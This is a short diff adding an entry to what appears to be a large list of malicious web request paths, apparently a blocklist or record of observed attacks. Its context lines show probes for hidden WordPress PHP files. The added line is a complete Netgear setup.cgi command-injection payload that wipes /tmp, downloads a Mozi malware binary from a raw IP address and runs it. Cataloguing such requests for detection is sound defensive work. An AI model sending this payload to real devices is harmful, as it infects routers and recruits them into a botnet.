@@ -24950,3 +24950,4 @@ packetsdatabase.com:443
 /wp-include/.wp-include.php?slince_golden=test
 /wp-content/.wp-content.php?slince_golden=test
 /wp-admin/.wp-admin.php?slince_golden=test
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.127.123.76:38272/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
